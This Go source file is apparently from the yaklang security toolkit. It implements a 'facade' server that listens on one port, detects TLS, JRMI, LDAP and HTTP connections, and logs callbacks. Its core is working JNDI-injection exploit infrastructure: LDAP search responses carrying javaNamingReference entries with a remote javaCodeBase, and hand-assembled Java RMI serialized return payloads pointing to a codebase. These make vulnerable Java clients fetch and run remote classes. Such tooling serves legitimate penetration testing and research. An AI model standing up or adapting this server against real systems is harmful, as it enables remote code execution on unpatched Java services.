package facades

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/lor00x/goldap/message"
	"github.com/yaklang/yaklang/common/facades/ldap/ldapserver"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/tlsutils"
	"github.com/yaklang/yaklang/common/yserx"
	"github.com/yaklang/yaklang/common/yso"

	//"palm/common/yak/yaklib"

	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
)

const (
	LDAPMsgFlag         = "ldap_flag"
	RMIMsgFlag          = "rmi"
	RMIHandshakeMsgFlag = "rmi-handshake"
)

const (
	emptyVerbose         = "<empty>"
	getInfoFailedVerbose = "<get info failed>"
)

type FacadeResourceType interface {
	[]byte | map[string]any | *HttpResource
}
type resourceAndVerbose[T FacadeResourceType] struct {
	Resource T
	Verbose  string
}
type FacadeServerResource[T FacadeResourceType] struct {
	lock      sync.Mutex
	Resources map[string]*resourceAndVerbose[T]
}

func NewFacadeServerResource[T FacadeResourceType]() *FacadeServerResource[T] {
	return &FacadeServerResource[T]{
		Resources: map[string]*resourceAndVerbose[T]{},
	}
}

func (f *FacadeServerResource[T]) ForEachResource(fun func(token string, resource T, verbose string) error) error {
	f.lock.Lock()
	defer func() {
		f.lock.Unlock()
	}()
	for k, r := range f.Resources {
		err := fun(k, r.Resource, r.Verbose)
		if err != nil {
			return err
		}
	}
	return nil
}

func (f *FacadeServerResource[T]) DeleteResource(token string) {
	f.lock.Lock()
	defer func() {
		f.lock.Unlock()
	}()
	delete(f.Resources, token)
}

func (f *FacadeServerResource[T]) GetResource(token string) (T, string, bool) {
	f.lock.Lock()
	defer func() {
		f.lock.Unlock()
	}()
	if v, ok := f.Resources[token]; ok {
		verbose := v.Verbose
		if v.Verbose == "" {
			verbose = getInfoFailedVerbose
		}
		return v.Resource, verbose, true
	}
	return nil, "", false
}

func (f *FacadeServerResource[T]) SetResource(token string, data T, verbose string) {
	f.lock.Lock()
	defer func() {
		f.lock.Unlock()
	}()
	f.Resources[token] = &resourceAndVerbose[T]{
		Resource: data,
		Verbose:  verbose,
	}
}

type FacadeServer struct {
	cancel func()

	Host         string
	Port         int
	ExternalHost string
	// 反连地址
	ReverseAddr string

	rmiResourceAddrs           *FacadeServerResource[[]byte]
	ldapResourceAddrs          *FacadeServerResource[map[string]any]
	httpResource               *FacadeServerResource[*HttpResource]
	handlers                   []func(notification *Notification)
	RemoteAddrConvertorHandler func(string) string
	// resourceName               string
	ldapEntry map[string]interface{}
	httpMux   *sync.Mutex
}

type ResourcesInfo struct {
	Protocol    string
	Url         string
	Data        any
	DataVerbose string
}

func (f *FacadeServer) GetAllResourcesInfo() []*ResourcesInfo {
	var res []*ResourcesInfo
	f.rmiResourceAddrs.ForEachResource(func(token string, resource []byte, verbose string) error {
		res = append(res, &ResourcesInfo{
			Protocol:    "rmi",
			Url:         fmt.Sprintf("rmi://%s/%s", f.ReverseAddr, token),
			Data:        resource,
			DataVerbose: verbose,
		})
		return nil
	})

	f.ldapResourceAddrs.ForEachResource(func(token string, resource map[string]any, verbose string) error {
		res = append(res, &ResourcesInfo{
			Protocol:    "ldap",
			Url:         fmt.Sprintf("ldap://%s/%s", f.ReverseAddr, token),
			Data:        resource,
			DataVerbose: verbose,
		})
		return nil
	})

	f.httpResource.ForEachResource(func(token string, resource *HttpResource, verbose string) error {
		res = append(res, &ResourcesInfo{
			Protocol:    "http",
			Url:         fmt.Sprintf("http://%s/%s", f.ReverseAddr, token),
			Data:        resource,
			DataVerbose: verbose,
		})
		return nil
	})
	return res
}

type (
	FactoryFun         func() string
	FacadeServerConfig func(f *FacadeServer)
)

func SetLdapResponseEntry(token string, data map[string]any, verbose string) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.ldapResourceAddrs.SetResource(token, data, verbose)
	}
}

func SetJavaClassName(name string) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.ldapEntry["javaClassName"] = name
	}
}

func SetLdapResourceAddr(name string, addr string) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.ldapResourceAddrs.SetResource(name, map[string]any{
			"javaClassName": name,
			"javaCodeBase":  addr,
			"javaFactory":   name,
			"objectClass":   "javaNamingReference",
		}, fmt.Sprintf("codebase: %s", addr))
	}
}

func SetJavaCodeBase(codeBase string) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.ldapEntry["javaCodeBase"] = codeBase
	}
}

func SetObjectClass(obj string) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.ldapEntry["objectClass"] = obj
	}
}

func SetjavaFactory(factory string) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.ldapEntry["javaFactory"] = factory
	}
}

func SetReverseAddress(address string) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.ReverseAddr = address
	}
}

func (f *FacadeServer) Config(configs ...FacadeServerConfig) {
	for _, config := range configs {
		config(f)
	}
}

func SetRmiResource(name string, resource []byte, verbose string) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.rmiResourceAddrs.SetResource(name, resource, verbose)
	}
}

func SetRmiResourceAddr(name string, rmiResourceAddr string) FacadeServerConfig {
	return func(f *FacadeServer) {
		objIns, err := LoadReferenceResourceForRmi()
		if err != nil {
			log.Errorf("load serialized data failed: %s", err)
			return
		}
		yso.ReplaceStringInJavaSerilizable(objIns, "{{className}}", name, -1)
		yso.ReplaceStringInJavaSerilizable(objIns, "{{factoryName}}", name, -1)
		yso.ReplaceStringInJavaSerilizable(objIns, "{{codebase}}", rmiResourceAddr, -1)
		payload, err := yso.ToBytes(objIns, yso.SetToBytesJRMPMarshalerWithCodeBase(""))
		payloadBuf := bytes.Buffer{}
		payloadBuf.WriteByte(0x51)                       // Return
		payloadBuf.Write([]byte{0xac, 0xed, 0x00, 0x05}) // stream header
		payloadBuf.Write([]byte{0x77, 0x0f})             // TC_BLOCKDATA Header,length: 0x0f
		payloadBuf.WriteByte(0x01)                       // NormalReturn
		payloadBuf.Write(yserx.IntTo4Bytes(0))           // unique
		payloadBuf.Write(yserx.Uint64To8Bytes(0))        // time
		payloadBuf.Write(yserx.IntTo2Bytes(0))           // count
		payloadBuf.Write(payload[4:])
		rmiPayload := payloadBuf.Bytes()
		f.rmiResourceAddrs.SetResource(name, rmiPayload, fmt.Sprintf("codebase: %s", rmiResourceAddr))
	}
}

func SetHttpResource(name string, resource []byte) FacadeServerConfig {
	return func(f *FacadeServer) {
		f.SetHttpRawResource("/"+name, resource)
	}
}

//func (f *FacadeServer) SetLDAPEntiy(ldapEntry map[string]interface{}) {
//	f.ldapEntry = ldapEntry
//}
//func (f *FacadeServer) ClassNameFactory(n int) FactoryFun {
//	return func() string {
//		const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
//		b := make([]byte, n)
//		for i := range b {
//			b[i] = letters[rand.Intn(len(letters))]
//		}
//		return string(b)
//	}
//}

/*
	ctx, cancel := context.WithCancel(context.Background())

	httpServer = newHTTPSERVERF()
	httpServer.SetContext(ctx)
	go httpServer.Run()
	err = utils.WaitConnect(httpServer.Addr())
	if err != nil {
		return err
	}

	facades.SetLDAPFallback(func() []byte {
		addr = httpServer.Addr()
		return Marshal(generatePayload(addr))
	})
	go facades.Run()
	err = utils.WaitConn(...)
*/

func (F *FacadeServer) ConvertRemoteAddr(addr string) string {
	if F.RemoteAddrConvertorHandler != nil {
		return F.RemoteAddrConvertorHandler(addr)
	}
	return addr
}

func Serve(host string, port int, configs ...FacadeServerConfig) error {
	server := NewFacadeServer(host, port, configs...)
	err := server.ServeWithContext(context.Background())
	if err != nil {
		return err
	}
	return nil
}

func NewFacadeServer(host string, port int, configs ...FacadeServerConfig) *FacadeServer {
	facadeServer := &FacadeServer{
		Host:              host,
		Port:              port,
		ldapEntry:         make(map[string]interface{}),
		httpResource:      NewFacadeServerResource[*HttpResource](),
		rmiResourceAddrs:  NewFacadeServerResource[[]byte](),
		ldapResourceAddrs: NewFacadeServerResource[map[string]any](),
		httpMux:           &sync.Mutex{},
	}
	facadeServer.rmiResourceAddrs.SetResource("", nil, emptyVerbose)
	facadeServer.httpResource.SetResource("", NewHttpRawResource([]byte(defaultHTTPFallback)), emptyVerbose)
	facadeServer.ldapResourceAddrs.SetResource("", nil, emptyVerbose)
	for _, config := range configs {
		config(facadeServer)
	}
	return facadeServer
}

func (f *FacadeServer) GetAddr() string {
	return fmt.Sprintf("%s:%d", f.Host, f.Port)
}

func (f *FacadeServer) OnHandle(h func(n *Notification)) {
	f.handlers = append(f.handlers, h)
}

func (f *FacadeServer) triggerNotification(t string, conn net.Conn, token string, raw []byte) {
	f.triggerNotificationEx(t, conn, token, raw, "")
}

func (f *FacadeServer) triggerNotificationEx(t string, conn net.Conn, token string, raw []byte, responseInfo string) {
	remoteAddr := f.ConvertRemoteAddr(conn.RemoteAddr().String())

	if token == "" {
		log.Infof("trigger %v from %v", t, f.ConvertRemoteAddr(conn.RemoteAddr().String()))
	} else {
		log.Infof("trigger %v[%v] from %v", t, token, f.ConvertRemoteAddr(conn.RemoteAddr().String()))
	}

	notif := NewNotification(t, remoteAddr, raw, token)
	// 通过conn的地址计算hash（因为每次连接的conn都是独立的对象，所以可以用conn地址的hash区分不同连接）
	// 通过这个hash去判断是否是同一个连接，如果是同一个连接，则在原通知基础上进行更新，否则新增通知
	notif.ConnectHash = codec.Md5(fmt.Sprintf("%p", conn))
	// 响应内容
	notif.ResponseInfo = responseInfo
	if len(f.handlers) <= 0 {
		// spew.Dump(notif)
	}

	for _, handle := range f.handlers {
		if handle == nil {
			return
		}
		handle(notif)
	}
}

func (f *FacadeServer) Serve() error {
	return f.ServeWithContext(context.Background())
}

func (f *FacadeServer) CancelServe() {
	if f.cancel != nil {
		f.cancel()
	}
}

func (f *FacadeServer) ServeWithContext(ctx context.Context) error {
	ctx, cancel := context.WithCancel(ctx)
	f.cancel = cancel
	lis, err := net.Listen("tcp", utils.HostPort(f.Host, f.Port))
	if f.Port == 0 {
		f.Port = lis.Addr().(*net.TCPAddr).Port
	}
	log.Infof("start to listen reverse(facade) on: %s:%d", f.Host, f.Port)

	if err != nil {
		return utils.Errorf("create listen failed: %s", err)
	}

	go func() {
		<-ctx.Done()
		lis.Close()
	}()

	for {
		conn, err := lis.Accept()
		if err != nil {
			return err
		}

		go func() {
			defer conn.Close()
			defer func() {
				if err := recover(); err != nil {
					log.Error(err)
					return
				}
			}()
			f.triggerNotification("tcp", conn, "", nil)
			log.Infof("recv conn from: %s", conn.RemoteAddr())
			f.handleConn(conn)
		}()
	}
}

func (f *FacadeServer) handleConn(conn net.Conn) {
	isTls := utils.NewBool(false)
WRAPPER:
	peekableConn := utils.NewPeekableNetConn(conn)
	raw, err := peekableConn.Peek(4)
	// buff := make([]byte, 7)
	// typ, err := peekableConn.Read(buff)
	// typ := utils.StableReaderEx(peekableConn, 5*time.Second, 10240)
	// println(codec.EncodeToHex(typ))
	// br := bufio.NewReader(peekableConn)
	// buf := make([]byte, 12)
	// br.Read(buf)
	// println(codec.EncodeToHex(raw))
	// println(string(raw))
	if err != nil {
		log.Errorf("peek 4byte failed: %s", err)
		return
	}
	switch raw[0] {
	case 0x16: // tls
		tlsConn := tlsutils.NewDefaultTLSServer(peekableConn)
		log.Error("https conn is recv... start to handshake")
		err := tlsConn.Handshake()
		if err != nil {
			conn.Close()
			log.Errorf("handle shake failed: %s", err)
			return
		}
		log.Infof("handshake finished for %v", conn.RemoteAddr())
		// conn = tlsConn
		f.triggerNotification("tls", conn, "", nil)
		isTls.Set()
		goto WRAPPER
	case 'J': // 4a524d49 (JRMI)
		if codec.EncodeToHex(raw) == "4a524d49" {
			log.Info("handle for JRMI")
			err := f.rmiShakeHands(peekableConn)
			if err != nil {
				log.Errorf("rmi handshak failed: %s", err)
				peekableConn.Close()
				return
			}

			log.Infof("start to serve for rmi client")
			peekableConn.SetReadDeadline(time.Now().Add(10 * time.Second))
			err = f.rmiServe(peekableConn)
			if err != nil {
				log.Errorf("serve rmi failed: %s", err)
				peekableConn.Close()
				return
			}

			peekableConn.Close()
			return
		}
	// 48, 12, 2, 1, 1, 96, 7, 2, 1, 3, 4, 0, -128, 0, -128, 0, -128, 0,
	//	(48)"Ber.ASN_SEQUENCE | Ber.ASN_CONSTRUCTOR", (12)len, (2,1,1)curMsgId, (97)LdapClient.LDAP_REQ_BIND, (7)len, (2,1,3)isLdapv3, (4)isLdapv3, (...) toServer
	case 0x30:
		if err != nil {
			log.Errorf("peek 3byte failed: %s", err)
			return
		}
		if f.ldapEntry == nil {
			log.Errorf("not set ldap entry")
			return
		}
		f.triggerNotification(LDAPMsgFlag, conn, "", nil)
		server := ldapserver.NewServer()
		routes := ldapserver.NewRouteMux()
		routes.Bind(func(writer ldapserver.ResponseWriter, message *ldapserver.Message) {
			res := ldapserver.NewBindResponse(ldapserver.LDAPResultSuccess)
			writer.Write(res)
			return
		})
		routes.Search(func(writer ldapserver.ResponseWriter, m *ldapserver.Message) {
			searchReq := (m.GetSearchRequest())
			reqResource := string((&searchReq).BaseObject())
			// className := "cmd_" + randStr(8)
			// addr := fmt.Sprintf("http://%s/%s.class", peekableConn.RemoteAddr(), f.resourceName)
			e := ldapserver.NewSearchResultEntry(fmt.Sprintf("dc=%s,dc=com", "tmp"))
			entry, entryVerbose, ok := f.ldapResourceAddrs.GetResource(reqResource)
			if !ok {
				f.triggerNotificationEx(LDAPMsgFlag, conn, reqResource, nil, emptyVerbose)
				return
			}
			for k, v := range entry {
				e.AddAttribute(message.AttributeDescription(k), message.AttributeValue(utils.InterfaceToString(v))) // 类名，可以任意
			}
			writer.Write(e)
			res := ldapserver.NewSearchResultDoneResponse(ldapserver.LDAPResultSuccess)
			writer.Write(res)
			marshalData, err := json.Marshal(entry)
			if err != nil {
				log.Errorf("marshal ldap entry error: %v", err)
			}
			f.triggerNotificationEx(LDAPMsgFlag, conn, reqResource, marshalData, entryVerbose)
		})
		server.Handle(routes)
		cli, err := server.NewClient(peekableConn)
		if err != nil {
			log.Errorf("start : %s", err)
			return
		}
		cli.Serve()
		peekableConn.Close()
	default:
		log.Infof("start to fallback http handlers for: %s", conn.RemoteAddr())
		err = f.getHTTPHandler(isTls.IsSet())(peekableConn)
		if err != nil {
			log.Errorf("handle http failed: %s", err)
			return
		}
	}
}
